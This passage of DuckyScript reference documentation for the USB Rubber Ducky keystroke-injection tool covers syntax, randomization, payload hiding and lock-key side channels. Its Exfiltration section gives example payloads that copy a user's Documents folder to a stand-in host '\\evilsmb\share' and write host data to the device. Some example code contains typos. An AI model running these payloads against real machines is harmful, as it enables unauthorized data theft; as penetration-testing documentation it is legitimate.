+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $BLINK = TRUE<br>VAR $BLINK_TIME = 1000<br></code></pre></td></tr></table></figure>
+
+<h2 id="Operators"><a href="#Operators" class="headerlink" title="Operators"></a>Operators</h2><p>Operators instruct the payload to perform a given mathematical, relational or logical operation.</p>
+<h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>=</td>
+<td>Assignment</td>
+</tr>
+<tr>
+<td>+</td>
+<td>Add</td>
+</tr>
+<tr>
+<td>-</td>
+<td>Subtract</td>
+</tr>
+<tr>
+<td>*</td>
+<td>Multiply</td>
+</tr>
+<tr>
+<td>/</td>
+<td>Divide</td>
+</tr>
+<tr>
+<td>%</td>
+<td>Modulus</td>
+</tr>
+<tr>
+<td>^</td>
+<td>Exponent</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $FOO = 1337<br>$FOO = ( $FOO - 1295 )<br>REM $FOO was assigned 1337, subtracted 1295, and ended up equalling 42.<br></code></pre></td></tr></table></figure>
+
+<h3 id="Comparison"><a href="#Comparison" class="headerlink" title="Comparison"></a>Comparison</h3><p>Will compare two values to evaluate a single boolean value.</p>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>==</td>
+<td>Equal to</td>
+</tr>
+<tr>
+<td>!=</td>
+<td>Not equal to</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>Greater than</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>Less than</td>
+</tr>
+<tr>
+<td>&gt;=</td>
+<td>Greater than or equal to</td>
+</tr>
+<tr>
+<td>&lt;=</td>
+<td>Less than or equal to</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $FOO = 42<br>VAR $BAR = 1337<br>IF ( $FOO &lt; $BAR ) THEN<br>    STRING 42 is less than 1337<br>END_IF<br></code></pre></td></tr></table></figure>
+
+<h3 id="Order-of-Operations"><a href="#Order-of-Operations" class="headerlink" title="Order of Operations"></a>Order of Operations</h3><p>Parentheses <code>( )</code> are required to define the precedence conventions.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $FOO = 42<br>VAR $BAR = (( 100 * 13 ) + ( $FOO - 5 ))<br></code></pre></td></tr></table></figure>
+
+<h3 id="Logical-Operators"><a href="#Logical-Operators" class="headerlink" title="Logical Operators"></a>Logical Operators</h3><p>Logical operators may be used to connect two or more expressions.</p>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;&amp;</td>
+<td>Logical AND. If both the operands are non-zero, the condition is <code>TRUE</code>.</td>
+</tr>
+<tr>
+<td>|</td>
+<td>Logical OR. If any of the two operands is non-zero, the condition is <code>TRUE</code>.</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $FOO = 42<br>VAR $BAR = 1337<br>IF ( $FOO &lt; $BAR ) || ( $BAR == $FOO ) THEN<br>    STRING Either 42 is less than 1337 or 42 is equal to 1337<br>END_IF<br></code></pre></td></tr></table></figure>
+
+<h3 id="Augmented-Assignment"><a href="#Augmented-Assignment" class="headerlink" title="Augmented Assignment"></a>Augmented Assignment</h3><p>When assigning a value to a variable, the variable itself may be referenced.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $FOO = 1336<br>VAR $FOO = ( $FOO + 1 )<br></code></pre></td></tr></table></figure>
+
+<h3 id="Bitwise-Operators"><a href="#Bitwise-Operators" class="headerlink" title="Bitwise Operators"></a>Bitwise Operators</h3><p>Operate on the uint16 values at the binary level.</p>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;</td>
+<td>Bitwise AND. If the corresponding bits of the two operands is 1, will result in 1. Otherwise if either bit of an operand is 0, the result of the corresponding bit is evaluated as 0.</td>
+</tr>
+<tr>
+<td>|</td>
+<td>Bitwise OR. If at least one corresponding bit of the two operands is 1, will result in 1.</td>
+</tr>
+<tr>
+<td>&gt;&gt;</td>
+<td>Right Shift. Accepts two numbers. Right shifts the bits of the first operand. The second operand determines the number of places to shift.</td>
+</tr>
+<tr>
+<td>&lt;&lt;</td>
+<td>Left Shift. Accepts two numbers. Left shifts the bits of the first operand. The second operand decides the number of places to shift.</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE HID STORAGE VID_05AC PID_021E<br>VAR $FOO = $_CURRENT_VID<br>REM Because VID and PID parameters are little endian,<br>$FOO = ((($FOO &gt;&gt; 8) &amp; 0x00FF) | (($FOO &lt;&lt; 8) &amp; 0xFF00))<br>REM $FOO will now equal 0xAC05<br></code></pre></td></tr></table></figure>
+
+<h2 id="Conditional-Statements"><a href="#Conditional-Statements" class="headerlink" title="Conditional Statements"></a>Conditional Statements</h2><p>Conditional statements, loops and functions allow for dynamic execution.</p>
+<h3 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h3><p>The flow control statement <code>IF</code> will determine whether or not to execute its block of code based on the evaluation of an expression. One way to interpret an <code>IF</code> statement is to read it as “<code>IF</code> this condition is true, <code>THEN</code> do this”.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">$FOO = 42<br>$BAR = 1337<br>IF ( $FOO &lt; $BAR ) THEN<br>  STRING 42 is less than 1337<br>END_IF<br></code></pre></td></tr></table></figure>
+
+<h3 id="ELSE"><a href="#ELSE" class="headerlink" title="ELSE"></a>ELSE</h3><p>The <code>ELSE</code> statement is an optional component of the <code>IF</code> statement which will only execute when the <code>IF</code> statement condition is <code>FALSE</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">IF ( $_CAPSLOCK_ON == TRUE ) THEN<br>    STRING Capslock is on!<br>ELSE IF ( $_CAPSLOCK_ON == FALSE ) THEN<br>    STRING Capslock is off!<br>END_IF<br></code></pre></td></tr></table></figure>
+
+<h2 id="Loops"><a href="#Loops" class="headerlink" title="Loops"></a>Loops</h2><p>Loops are flow control statements that can be used to repeat instructions until a specific condition is reached.</p>
+<h3 id="WHILE"><a href="#WHILE" class="headerlink" title="WHILE"></a>WHILE</h3><p>The block of code within the <code>WHILE</code> statement will continue to repeatedly execute for a number of times (called iterations) for as long as the condition of the <code>WHILE</code> statement is <code>TRUE</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $FOO = 42<br>WHILE ( $FOO &gt; 0 )<br>    STRINGLN This message will repeat 42 times.<br>    $FOO = ( $FOO - 1 )<br>END_WHILE<br><br>WHILE TRUE<br>    SRINGLN This is an infinite loop. This message repeats forever.<br>END_WHILE<br></code></pre></td></tr></table></figure>
+
+<h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p>Functions are blocks of organized single-task code that let you more efficiently run the same code multiple times without the need to copy and paste large blocks of code over and over again.</p>
+<h3 id="FUNCTION"><a href="#FUNCTION" class="headerlink" title="FUNCTION"></a>FUNCTION</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">REM Types &quot;Hello.....World!&quot;<br><br>FUNCTION COUNTDOWN()<br>    WHILE ($TIMER &gt; 0)<br>        STRING .<br>        $TIMER = ($TIMER - 1)<br>        DELAY 500<br>    END_WHILE<br>END_FUNCTION<br><br>STRING Hello<br>VAR $TIMER = 5<br>COUNTDOWN()<br>STRING World!<br></code></pre></td></tr></table></figure>
+
+<h3 id="RETURN"><a href="#RETURN" class="headerlink" title="RETURN"></a>RETURN</h3><p>A function may return a integer or boolean value which may also be evaluated.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">FUNCITON TEST_CAPS_AND_NUM()<br>    IF (($_CAPSLOCK_ON == TRUE) &amp;&amp; ($_NUMLOCK_ON == TRUE)) THEN<br>        RETURN TRUE<br>    ELSE<br>        RETURN FALSE<br>    END_IF<br>END_FUNCTION<br><br>IF (TEST_CAPS_AND_NUM() == TRUE) THEN<br>    STRINGLN Caps lock and num lock are on.<br>END_IF<br></code></pre></td></tr></table></figure>
+
+<h2 id="Randomization"><a href="#Randomization" class="headerlink" title="Randomization"></a>Randomization</h2><p>The pseudorandom number generator provides randomization for keystroke injection, variables and attackmode parameters. The first time a randomization feature is used, a <code>seed.bin</code> will be generated on the root of the MicroSD card. One may also be generated from the <a target="_blank" rel="noopener" href="https://encoder.hak5.org/">Hak5 IDE</a>.</p>
+<h3 id="Random-Keystroke-Injection"><a href="#Random-Keystroke-Injection" class="headerlink" title="Random Keystroke Injection"></a>Random Keystroke Injection</h3><table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Character Set</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>RANDOM_LOWERCASE_LETTER</code></td>
+<td>abcdefghijklmnopqrstuvwxyz</td>
+</tr>
+<tr>
+<td><code>RANDOM_UPPERCASE_LETTER</code></td>
+<td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
+</tr>
+<tr>
+<td><code>RANDOM_LETTER</code></td>
+<td>abcdefghijklmnopqrstuvwxyz  <br>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
+</tr>
+<tr>
+<td><code>RANDOM_NUMBER</code></td>
+<td>0123456789</td>
+</tr>
+<tr>
+<td><code>RANDOM_SPECIAL</code></td>
+<td>!@#$%^&amp;*()</td>
+</tr>
+<tr>
+<td><code>RANDOM_CHAR</code></td>
+<td>abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ  <br>0123456789  <br>!@#$%^&amp;*()</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">REM 42 random characters<br>VAR $COUNT = 42<br>WHILE ($COUNT &gt; 0)<br>    RANDOM_CHAR<br>    $COUNT = ($COUNT + 1)<br>END_WHILE<br></code></pre></td></tr></table></figure>
+
+<h3 id="Random-Integers"><a href="#Random-Integers" class="headerlink" title="Random Integers"></a>Random Integers</h3><p>The internal variable <code>$_RANDOM_INT</code> assigns a random integer between the specified <code>$_RANDOM_MIN</code> and <code>$_RANDOM_MAX</code> values. May be 0-65535. The default values are <code>0-9</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">$_RANDOM_MIN = 42<br>$_RANDOM_MAX = 1337<br>VAR $FOO = $_RANDOM_INT<br><br>REM The variable $FOO will be between 42 and 1337<br></code></pre></td></tr></table></figure>
+
+<h3 id="Random-and-ATTACKMODE"><a href="#Random-and-ATTACKMODE" class="headerlink" title="Random and ATTACKMODE"></a>Random and ATTACKMODE</h3><p>The <code>ATTACKMODE</code> command may accept random values for the optional parameters.</p>
+<table>
+<thead>
+<tr>
+<th>ATTACKMODE Parameter</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>VID_RANDOM</code></td>
+<td>Random Vendor ID</td>
+</tr>
+<tr>
+<td><code>PID_RANDOM</code></td>
+<td>Random Product ID</td>
+</tr>
+<tr>
+<td><code>MAN_RANDOM</code></td>
+<td>Random 12 alphanumeric character iManufacturer</td>
+</tr>
+<tr>
+<td><code>PROD_RANDOM</code></td>
+<td>Random 12 alphanumeric character iProduct</td>
+</tr>
+<tr>
+<td><code>SERIAL_RANDOM</code></td>
+<td>Random 12 digit serial number</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE HID VID_RANDOM PID_RANDOM MAN_RANDOM PROD_RANDOM SERIAL_RANDOM<br></code></pre></td></tr></table></figure>
+
+<p>report<br>Use caution when using random <code>VID</code> and <code>PID</code> values as unexpected results are likely.</p>
+<h2 id="Holding-Keys"><a href="#Holding-Keys" class="headerlink" title="Holding Keys"></a>Holding Keys</h2><p>A key may be held, rather than pressed, by specifying a <code>HOLD</code> and <code>RELEASE</code> command with a <code>DELAY</code> in between the two. Both <code>HOLD</code> and <code>RELEASE</code> must specify a key. <a target="_blank" rel="noopener" href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/holding-keys/#holding-multiple-keys">Multiple simultaneous keys</a> may be held.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">HOLD a<br>DELAY 2000<br>RELEASE a<br><br>REM May produce any mumber of &quot;aaaaa&quot; keys, depending on the repeat rate of<br>REM the target OS. On macOS may open the accent menu.<br><br>INJECT_MOD<br>HOLD WINDOWS<br>DELAY 4000<br>RELEASE WINDOWS<br><br>REM Will hold the Windows key for 4 seconds. Note the use of INJECT_MOD<br>REM when using a modifier key without a key combination.<br></code></pre></td></tr></table></figure>
+
+<h2 id="Payload-Control"><a href="#Payload-Control" class="headerlink" title="Payload Control"></a>Payload Control</h2><p>These simple commands exist to control the execution of a payload.</p>
+<h3 id="RESTART-PAYLOAD"><a href="#RESTART-PAYLOAD" class="headerlink" title="RESTART_PAYLOAD"></a>RESTART_PAYLOAD</h3><p>The <code>RESTART_PAYLOAD</code> command ceases execution, restarting the payload from the beginning.</p>
+<h3 id="STOP-PAYLOAD"><a href="#STOP-PAYLOAD" class="headerlink" title="STOP_PAYLOAD"></a>STOP_PAYLOAD</h3><p>The <code>STOP_PAYLOAD</code> command ceases and further execution.</p>
+<h3 id="RESET"><a href="#RESET" class="headerlink" title="RESET"></a>RESET</h3><p>The <code>RESET</code> command clears the keystroke buffer, useful for debugging complex hold key states.</p>
+<h2 id="Jitter"><a href="#Jitter" class="headerlink" title="Jitter"></a>Jitter</h2><p>Jitter randomly varies the delay between individual key presses based on the <code>seed.bin</code> value.</p>
+<table>
+<thead>
+<tr>
+<th>Internal Variable</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$_JITTER_ENABLED</code></td>
+<td>Set <code>TRUE</code> to enable and <code>FALSE</code> to disable jitter.</td>
+</tr>
+<tr>
+<td><code>$_JITTER_MAX</code></td>
+<td>Integer (0-65535) of maximum time in milliseconds between keystrokes. Default 20.</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">$_JITTER_MAX = 60<br>$_JITTER_ENABLED = TRUE<br>STRINGLN The quick brown fox jumps over the lazy dog<br></code></pre></td></tr></table></figure>
+
+<h2 id="Payload-Hiding"><a href="#Payload-Hiding" class="headerlink" title="Payload Hiding"></a>Payload Hiding</h2><p>The <code>inject.bin</code> and <code>seed.bin</code> file may be hidden from the MicroSD card before implementing <code>ATTACKMODE STORAGE</code>. The <code>HIDE_PAYLOAD</code> and <code>RESTORE_PAYLOAD</code> commands must be run while using <code>ATTACKMODE OFF</code> or <code>ATTACKMODE HID</code>.</p>
+<h3 id="HIDE-PAYLOAD"><a href="#HIDE-PAYLOAD" class="headerlink" title="HIDE_PAYLOAD"></a>HIDE_PAYLOAD</h3><p>Hides the inject.bin and seed.bin files from the MicroSD card.</p>
+<h3 id="RESTORE-PAYLOAD"><a href="#RESTORE-PAYLOAD" class="headerlink" title="RESTORE_PAYLOAD"></a>RESTORE_PAYLOAD</h3><p>Restores the inject.bin and seed.bin files to the MicroSD card.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE OFF<br>HIDE_PAYLOAD<br>ATTACKMODE HID STORAGE<br>DELAY 2000<br>STRINGLN The payload files are hidden.<br>ATTACKMODE HID<br>RESTORE_PAYLOAD<br>DELAY 2000<br>STRINGLN Restoring the payload files...<br>ATTACKMODE HID STORAGE<br>DELAY 2000<br>STRINGLN The payload files have been restored.<br></code></pre></td></tr></table></figure>
+
+<h2 id="Lock-Keys-1"><a href="#Lock-Keys-1" class="headerlink" title="Lock Keys"></a>Lock Keys</h2><p>USB HID devices contain both IN endpoints for data (keystrokes) from the keyboard to computer, and OUT endpoints for data (LED states) from the computer to the keyboard. In many cases the LED state control codes sent from the computer to the attached keyboard are sent to all attached “keyboards”. Versions of macOS behave differently.</p>
+<h3 id="WAIT-FOR-Commands"><a href="#WAIT-FOR-Commands" class="headerlink" title="WAIT_FOR Commands"></a><code>WAIT_FOR</code> Commands</h3><table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>WAIT_FOR_CAPS_ON</code></td>
+<td>Pause until caps lock is turned on</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_CAPS_OFF</code></td>
+<td>Pause until caps lock is turned off</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_CAPS_CHANGE</code></td>
+<td>Pause until caps lock is toggled on or off</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_NUM_ON</code></td>
+<td>Pause until num lock is turned on</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_NUM_OFF</code></td>
+<td>Pause until num lock is turned off</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_NUM_CHANGE</code></td>
+<td>Pause until num lock is toggled on or off</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_SCROLL_ON</code></td>
+<td>Pause until scroll lock is turned on</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_SCROLL_OFF</code></td>
+<td>Pause until scroll lock is turned off</td>
+</tr>
+<tr>
+<td><code>WAIT_FOR_SCROLL_CHANGE</code></td>
+<td>Pause until scroll lock is toggled on or off</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRINGLN Hello,<br>STRINGLN [Press caps lock to continue...]<br>WAIT_FOR_CAPS_CHANGE<br>STRINGLN World!<br></code></pre></td></tr></table></figure>
+
+<h3 id="SAVE-and-RESTORE-Commands"><a href="#SAVE-and-RESTORE-Commands" class="headerlink" title="SAVE and RESTORE Commands"></a><code>SAVE</code> and <code>RESTORE</code> Commands</h3><p>The currently reported lock key states may be saved and later recalled using the <code>SAVE_HOST_KEYBOARD_LOCK_STATE</code> and <code>RESTORE_HOST_KEYBOARD_LOCK_STATE</code> commands.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">REM Save the LED states of the primary keyboard<br>SAVE_HOST_KEYBOARD_LOCK_STATE<br>REM Change the lock states<br>CAPSLOCK<br>NUMLOCK<br>REM Restore the original lock states<br>RESTORE_HOST_KEYBOARD_LOCK_STATE<br></code></pre></td></tr></table></figure>
+
+<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><p>Exfiltration is the unauthorized transfer of information from a system. Typically performed over a <a target="_blank" rel="noopener" href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration/#physical-medium-exfiltration">physical medium</a> (copying to a USB flash disk such as the USB Rubber Ducky while using <code>ATTACKMODE STORAGE</code>) or a <a target="_blank" rel="noopener" href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration/#network-medium-exfiltration">network medium</a> such as email, ftp, smb, http, etc.</p>
+<h3 id="Physical-Exfiltration-Example"><a href="#Physical-Exfiltration-Example" class="headerlink" title="Physical Exfiltration Example"></a>Physical Exfiltration Example</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE HID STORAGE<br>DELAY 2000<br>GUI r<br>DELAY 100<br>STRING powershell &quot;$m=(Get-Volume -FileSystemLabel &#x27;DUCKY&#x27;).DriveLetter;<br>STRINGLN echo $env:computername &gt;&gt; $m:\computer_names.txt&quot;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Network-Exfiltration-Example"><a href="#Network-Exfiltration-Example" class="headerlink" title="Network Exfiltration Example"></a>Network Exfiltration Example</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE HID<br>DELAY 2000<br>GUI r<br>DELAY 100<br>STRINGLN powershell &quot;cp -r $env:USERPROFILE\Documents\* \\evilsmb\share&quot;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Keystroke-Reflection"><a href="#Keystroke-Reflection" class="headerlink" title="Keystroke Reflection"></a>Keystroke Reflection</h3><p>By taking advantage of the <a target="_blank" rel="noopener" href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/lock-keys/#end-points-and-control-codes">HID OUT endpoint</a> as described in the <a target="_blank" rel="noopener" href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/lock-keys/">lock keys</a> section, binary data may be exfiltrated “out of band” using the Keystroke Reflection side-channel attack. This is done by using the <code>$_EXFIL_MODE_ENABLED</code> internal variable. The reflected lock keystrokes are saved to <a target="_blank" rel="noopener" href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration/#working-with-loot"><code>loot.bin</code></a> on the root of the MicroSD card. For a detailed example, see the section on <a target="_blank" rel="noopener" href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration/#the-keystroke-reflection-attack">Keystroke Reflection</a>.</p>
+<h3 id="Variable-Exfiltration"><a href="#Variable-Exfiltration" class="headerlink" title="Variable Exfiltration"></a>Variable Exfiltration</h3><p>Similarly, arbitrary variable data may be saved to the <code>loot.bin</code> file using the <code>EXFIL</code> command.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $FOO = 1337<br>EXFIL $FOO<br></code></pre></td></tr></table></figure>
+
+<h2 id="Internal-Variables"><a href="#Internal-Variables" class="headerlink" title="Internal Variables"></a>Internal Variables</h2><table>
+<thead>
+<tr>
+<th>Internal Variable</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>BUTTON</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_BUTTON_ENABLED</code></td>
+<td>Returns <code>TRUE</code> if the button is enabled or <code>FALSE</code> if the button is disabled.</td>
+</tr>
+<tr>
+<td><code>$_BUTTON_USER_DEFINED</code></td>
+<td>Returns <code>TRUE</code> if a <code>BUTTON_DEF</code> has been implemented in the payload or <code>FALSE</code> if it hasn’t been implemented.</td>
+</tr>
+<tr>
+<td><code>$_BUTTON_PUSH_RECEIVED</code></td>
+<td>Returns <code>TRUE</code> if the button has ever been pressed. May be retrieved or set.</td>
+</tr>
+<tr>
+<td><code>$_BUTTON_TIMEOUT</code></td>
+<td>The button debounce, or cooldown time before counting the next button press, in milliseconds. The default value is <code>1000</code>.</td>
+</tr>
+<tr>
+<td><strong>LED</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_SYSTEM_LEDS_ENABLED</code></td>
+<td>Default set <code>TRUE</code>. May be retrieved or set. Boot and <code>ATTACKMODE</code> change LED.</td>
+</tr>
+<tr>
+<td><code>$_STORAGE_LEDS_ENABLED</code></td>
+<td>Default set <code>TRUE</code>. May be retrieved or set.<br><br>Blinks the LED red/green on storage read/write in <code>ATTACKMODE STORAGE</code>.</td>
+</tr>
+<tr>
+<td><code>$_LED_CONTINUOUS_SHOW_STORAGE_ACTIVITY</code></td>
+<td>Default set <code>TRUE</code>. May be retrieved or set.<br><br>The LED will light solid green when the storage has been inactive for longer than $<code>_STORAGE_ACTIVITY_TIMEOUT</code> (default 1000 ms). Otherwise, the LED will light red when active.</td>
+</tr>
+<tr>
+<td><code>$_INJECTING_LEDS_ENABLED</code></td>
+<td>Default set <code>TRUE</code>. May be retrieved or set. When <code>TRUE</code> the LED will blink green on payload execution.</td>
+</tr>
+<tr>
+<td><code>$_EXFIL_LEDS_ENABLED</code></td>
+<td>Default set <code>TRUE</code>. May be retrieved or set. When <code>TRUE</code> the LED will blink green during Keystroke Reflection.</td>
+</tr>
+<tr>
+<td><code>$_LED_SHOW_CAPS</code></td>
+<td>Default set <code>FALSE</code>. May be retrieved or set. When <code>TRUE</code> will bind the GREEN LED state to the <code>CAPSLOCK</code> state.</td>
+</tr>
+<tr>
+<td><code>$_LED_SHOW_NUM</code></td>
+<td>Default set <code>FALSE</code>. May be retrieved or set. When <code>TRUE</code> will bind the RED LED state to the <code>NUMLOCK</code> state.</td>
+</tr>
+<tr>
+<td><code>$_LED_SHOW_SCROLL</code></td>
+<td>Default set <code>FALSE</code>. May be retrieved or set. When <code>TRUE</code> will bind the GREEN LED state to the <code>SCROLLLOCK</code> state.</td>
+</tr>
+<tr>
+<td><strong>ATTACKMODE</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_CURRENT_VID</code></td>
+<td>Returns the currently operating Vendor ID with endian swapped. May only be retrieved. Cannot be set.</td>
+</tr>
+<tr>
+<td><code>$_CURRENT_PID</code></td>
+<td>Returns the currently operating Product ID with endian swapped. May only be retrieved. Cannot be set.</td>
+</tr>
+<tr>
+<td><code>$_CURRENT_ATTACKMODE</code></td>
+<td>Returns the currently operating ATTACKMODE represented as <code>0</code> for <code>OFF</code>, <code>1</code> for <code>HID</code>, <code>2</code> for STORAGE and <code>3</code> for both <code>HID</code> and <code>STORAGE</code></td>
+</tr>
+<tr>
+<td><strong>RANDOM</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_RANDOM_INT</code></td>
+<td>Random integer within set range.</td>
+</tr>
+<tr>
+<td><code>$_RANDOM_MIN</code></td>
+<td>Random integer minimum range (unsigned, 0-65535)</td>
+</tr>
+<tr>
+<td><code>$_RANDOM_MAX</code></td>
+<td>Random integer maximum range (unsigned, 0-65535)</td>
+</tr>
+<tr>
+<td><code>$_RANDOM_SEED</code></td>
+<td>Random seed from <code>seed.bin</code></td>
+</tr>
+<tr>
+<td><code>$_RANDOM_LOWER_LETTER_KEYCODE</code></td>
+<td>Returns random lower letter scancode (a-z)</td>
+</tr>
+<tr>
